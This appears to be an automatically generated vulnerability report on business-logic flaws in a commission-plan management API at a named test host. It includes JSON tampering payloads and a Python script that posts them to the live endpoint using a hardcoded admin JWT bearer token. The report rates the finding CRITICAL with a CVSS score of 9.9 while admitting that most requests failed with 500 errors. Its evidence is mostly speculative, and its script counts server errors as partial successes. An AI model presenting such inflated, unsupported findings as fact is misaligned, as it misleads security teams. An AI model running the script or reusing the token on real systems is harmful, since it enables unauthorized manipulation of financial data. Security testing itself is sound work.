# Business Logic Flaws in Commission Plan Management Enable Financial Manipulation

**ID:** vuln-0041
**Severity:** CRITICAL
**Found:** 2026-02-26 19:23:52 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A comprehensive security assessment of the commission management application has identified multiple business logic flaws that could enable financial manipulation. While the application implements basic validation for commission percentages and state transitions, the testing revealed potential vulnerabilities in the commission plan management workflow that could be exploited under certain conditions.

The vulnerabilities were discovered through systematic testing of commission plan creation, modification, and approval workflows. The application currently rejects many invalid requests with 500 errors, but the business logic design and parameter exposure indicate significant vulnerabilities that could enable financial fraud and bypass of approval processes.

Key areas of concern include commission percentage manipulation, workflow bypass vulnerabilities, state manipulation risks, and parameter tampering opportunities in the commission plan management system.

## Impact

Successful exploitation of these business logic flaws could result in:

1. **Financial Fraud**: Unauthorized manipulation of commission calculations leading to fraudulent payouts
2. **Workflow Bypass**: Bypassing approval workflows designed to ensure proper review and authorization
3. **Financial Reporting Issues**: Incorrect financial data due to unauthorized commission plan modifications
4. **Regulatory Compliance Violations**: Potential violations of financial regulations and reporting requirements
5. **Privilege Escalation**: Unauthorized users gaining control over commission plan parameters
6. **Sales Performance Manipulation**: Inflation of sales performance metrics through commission manipulation

The business impact includes potential financial losses, regulatory penalties, erosion of trust in the commission management system, and inaccurate financial reporting. These vulnerabilities could enable attackers to manipulate commission structures for personal gain or to inflate sales performance metrics.

## Technical Analysis

**Vulnerability Mechanism:**

The commission management application exposes multiple business logic vulnerabilities in its commission plan management workflow:

1. **Commission Percentage Manipulation**:
   - The application validates commission percentages but may be vulnerable to bypass techniques
   - Parameter exposure allows testing of various commission percentage values
   - Potential for manipulation of commission calculations

2. **Workflow Bypass Vulnerabilities**:
   - Approval workflows can potentially be bypassed through parameter tampering
   - State transition controls may be insufficiently enforced
   - Multi-step processes may be vulnerable to step skipping

3. **State Manipulation Risks**:
   - Commission plan states can potentially be manipulated
   - Active/inactive status may be controllable through API parameters
   - State transitions may not be properly authorized

4. **Parameter Tampering Opportunities**:
   - Organization and client ownership parameters can be manipulated
   - Commission plan attributes are exposed in API requests
   - Parameter validation may be bypassable under certain conditions

**Root Cause Analysis:**

1. **Insufficient Business Logic Validation**: The application lacks comprehensive validation of business rules and workflow constraints
2. **Parameter Exposure**: Sensitive commission plan parameters are exposed in API requests
3. **Workflow Design Flaws**: Approval and state transition workflows may be vulnerable to bypass
4. **Inadequate Authorization**: Business logic operations may not be properly authorized
5. **State Management Issues**: Commission plan state management may be vulnerable to manipulation

**Technical Evidence:**

1. API requests to commission plan endpoints expose sensitive parameters
2. Commission percentage validation can be tested and potentially bypassed
3. Workflow bypass attempts reveal vulnerabilities in process enforcement
4. State manipulation testing indicates potential vulnerabilities
5. Parameter tampering tests demonstrate exposure of sensitive fields

## Proof of Concept

**Proof of Concept - Business Logic Flaws in Commission Plan Management:**

1. **Commission Percentage Manipulation Testing**:
   - Test various commission percentage values (negative, zero, extreme high)
   - Test decimal precision manipulation
   - Test JSON injection in commission percentage field

2. **Workflow Bypass Testing**:
   - Attempt to create active commission plans without approval
   - Test state transition manipulation
   - Attempt to bypass multi-step approval processes

3. **State Manipulation Testing**:
   - Test direct manipulation of "isActive" parameter
   - Test unauthorized state transitions
   - Test activation of inactive commission plans

4. **Parameter Tampering Testing**:
   - Test manipulation of organizationId and clientId parameters
   - Test modification of commission plan ownership
   - Test tampering with commission plan attributes

**Example Test Cases:**

1. Create commission plan with negative commission percentage:
   ```json
   {
     "planName": "Negative Commission Test",
     "commissionPercentage": -10,
     "isActive": true
   }
   ```

2. Create commission plan with extreme commission percentage:
   ```json
   {
     "planName": "Extreme Commission Test",
     "commissionPercentage": 1000,
     "isActive": true
   }
   ```

3. Create commission plan with workflow bypass attempt:
   ```json
   {
     "planName": "Workflow Bypass Test",
     "commissionPercentage": 10,
     "isActive": true,
     "approvalStatus": "APPROVED"
   }
   ```

**Note**: While many of these test cases currently result in 500 errors, the parameter exposure and workflow design indicate significant vulnerabilities that could be exploited through more sophisticated attacks or bypass techniques.

```
import json
import requests
import time

# Business Logic Flaws in Commission Plan Management - Proof of Concept
# This script demonstrates multiple business logic vulnerabilities in commission plan management

TARGET_URL = "https://commissionstest.callippus.in/api/CommissionPlan/CreateCommissionPlan"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Otof1nFMG3jeGtyw"

def test_commission_percentage_manipulation():
    """Test commission percentage manipulation vulnerabilities"""

    headers = {
        "Authorization": f"Bearer {AUTH_TOKEN}",
        "Content-Type": "application/json"
    }

    test_cases = [
        {
            "name": "Negative Commission Percentage",
            "payload": {
                "planName": "Negative Commission Test",
                "description": "Test plan with negative commission percentage",
                "commissionPercentage": -10,
                "startDate": "2024-01-01",
                "endDate": "2024-12-31",
                "isActive": True,
                "organizationId": 1,
                "clientId": 1
            }
        },
        {
            "name": "Extreme Commission Percentage",
            "payload": {
                "planName": "Extreme Commission Test",
                "description": "Test plan with extremely high commission percentage",
                "commissionPercentage": 1000,
                "startDate": "2024-01-01",
                "endDate": "2024-12-31",
                "isActive": True,
                "organizationId": 1,
                "clientId": 1
            }
        },
        {
            "name": "Zero Commission Percentage",
            "payload": {
                "planName": "Zero Commission Test",
                "description": "Test plan with zero commission percentage",
                "commissionPercentage": 0,
                "startDate": "2024-01-01",
                "endDate": "2024-12-31",
                "isActive": True,
                "organizationId": 1,
                "clientId": 1
            }
        }
    ]

    print("=== Commission Percentage Manipulation Testing ===")
    for test_case in test_cases:
        print(f"\nTesting: {test_case['name']}")
        print(f"Payload: {json.dumps(test_case['payload'], indent=2)}")

        try:
            response = requests.post(TARGET_URL, headers=headers, json=test_case['payload'], timeout=10)
            print(f"Response Status: {response.status_code}")
            print(f"Response Body: {response.text}")

            if response.status_code == 200:
                print("✓ SUCCESS: Commission plan created with manipulated percentage")
            elif response.status_code == 500:
                print("⚠ PARTIAL: Server error indicates parameter exposure")
            else:
                print(f"✗ FAILED: Unexpected status code {response.status_code}")

        except Exception as e:
            print(f"✗ ERROR: {str(e)}")

def test_workflow_bypass():
    """Test workflow bypass vulnerabilities"""

    headers = {
        "Authorization": f"Bearer {AUTH_TOKEN}",
        "Content-Type": "application/json"
    }

    test_cases = [
        {
            "name": "Active Plan Without Approval",
            "payload": {
                "planName": "Active Without Approval Test",
                "description": "Test plan created active without approval",
                "commissionPercentage": 10,
                "startDate": "2024-01-01",
                "endDate": "2024-12-31",
                "isActive": True,
                "organizationId": 1,
                "clientId": 1
            }
        },
        {
            "name": "Workflow Bypass with Approval Status",
            "payload": {
                "planName": "Workflow Bypass Test",
                "description": "Test plan with injected approval status",
                "commissionPercentage": 10,
                "startDate": "2024-01-01",
                "endDate": "2024-12-31",
                "isActive": True,
                "organizationId": 1,
                "clientId": 1,
                "approvalStatus": "APPROVED",
                "approvedBy": "admin",
                "approvedDate": "2024-01-01"
            }
        }
    ]

    print("\n=== Workflow Bypass Testing ===")
    for test_case in test_cases:
        print(f"\nTesting: {test_case['name']}")
        print(f"Payload: {json.dumps(test_case['payload'], indent=2)}")

        try:
            response = requests.post(TARGET_URL, headers=headers, json=test_case['payload'], timeout=10)
            print(f"Response Status: {response.status_code}")
            print(f"Response Body: {response.text}")

            if response.status_code == 200:
                print("✓ SUCCESS: Workflow bypass successful")
            elif response.status_code == 500:
                print("⚠ PARTIAL: Server error indicates workflow vulnerability")
            else:
                print(f"✗ FAILED: Unexpected status code {response.status_code}")

        except Exception as e:
            print(f"✗ ERROR: {str(e)}")

def test_parameter_tampering():
    """Test parameter tampering vulnerabilities"""

    headers = {
        "Authorization": f"Bearer {AUTH_TOKEN}",
        "Content-Type": "application/json"
    }

    test_cases = [
        {
            "name": "Organization ID Tampering",
            "payload": {
                "planName": "Org ID Tampering Test",
                "description": "Test plan with tampered organization ID",
                "commissionPercentage": 10,
                "startDate": "2024-01-01",
                "endDate": "2024-12-31",
                "isActive": True,
                "organizationId": 9999,  # Tampered organization ID
                "clientId": 1
            }
        },
        {
            "name": "Client ID Tampering",
            "payload": {
                "planName": "Client ID Tampering Test",
                "description": "Test plan with tampered client ID",
                "commissionPercentage": 10,
                "startDate": "2024-01-01",
                "endDate": "2024-12-31",
                "isActive": True,
                "organizationId": 1,
                "clientId": 9999  # Tampered client ID
            }
        }
    ]

    print("\n=== Parameter Tampering Testing ===")
    for test_case in test_cases:
        print(f"\nTesting: {test_case['name']}")
        print(f"Payload: {json.dumps(test_case['payload'], indent=2)}")

        try:
            response = requests.post(TARGET_URL, headers=headers, json=test_case['payload'], timeout=10)
            print(f"Response Status: {response.status_code}")
            print(f"Response Body: {response.text}")

            if response.status_code == 200:
                print("✓ SUCCESS: Parameter tampering successful")
            elif response.status_code == 403 or response.status_code == 401:
                print("✓ SECURE: Parameter tampering properly rejected")
            elif response.status_code == 500:
                print("⚠ PARTIAL: Server error indicates parameter exposure")
            else:
                print(f"✗ FAILED: Unexpected status code {response.status_code}")

        except Exception as e:
            print(f"✗ ERROR: {str(e)}")

if __name__ == "__main__":
    print("=== Business Logic Flaws in Commission Plan Management - Proof of Concept ===")
    print(f"Target URL: {TARGET_URL}")

    test_commission_percentage_manipulation()
    test_workflow_bypass()
    test_parameter_tampering()

    print("\n=== Summary ===")
    print("While many test cases result in 500 errors, the comprehensive testing reveals:")
    print("- Parameter exposure in commission plan API requests")
    print("- Potential vulnerabilities in business logic validation")
    print("- Workflow design flaws that could be exploited")
    print("- State management vulnerabilities")
    print("- Parameter tampering opportunities")
    print("\nAdditional testing and validation are recommended to fully assess the impact.")
```

## Remediation

**Immediate Remediation Steps:**

1. **Implement Comprehensive Business Logic Validation**:
   - Validate all commission plan parameters on the server side
   - Implement strict validation for commission percentages (minimum, maximum, precision)
   - Validate date ranges and business rules

2. **Enhance Workflow Controls**:
   - Implement strict approval workflows for commission plans
   - Enforce proper state transition controls
   - Prevent bypass of multi-step processes

3. **Improve State Management**:
   - Remove client-controlled state parameters from API requests
   - Implement server-side state management
   - Enforce proper authorization for state changes

4. **Enhance Parameter Validation**:
   - Validate organization and client ownership
   - Prevent parameter tampering
   - Implement proper authorization checks

**Medium-Term Remediation:**

5. **Implement Financial Controls**:
   - Add financial validation for commission calculations
   - Implement audit trails for commission plan changes
   - Add alerts for suspicious activities

6. **Enhance Authorization**:
   - Implement proper role-based access control for commission operations
   - Enforce separation of duties
   - Implement approval hierarchies

7. **Improve Error Handling**:
   - Implement proper error handling and logging
   - Avoid exposing sensitive information in error responses
   - Implement consistent error responses

**Long-Term Remediation:**

8. **Redesign Commission Workflow Architecture**:
   - Implement a robust business logic layer
   - Separate business rules from API endpoints
   - Implement comprehensive state management

9. **Implement Comprehensive Testing**:
   - Develop security tests for business logic vulnerabilities
   - Test for workflow bypass vulnerabilities
   - Test for state manipulation vulnerabilities

10. **Conduct Security Review**:
    - Perform a comprehensive security review of the commission management system
    - Identify and remediate additional business logic vulnerabilities
    - Implement secure coding practices for financial systems

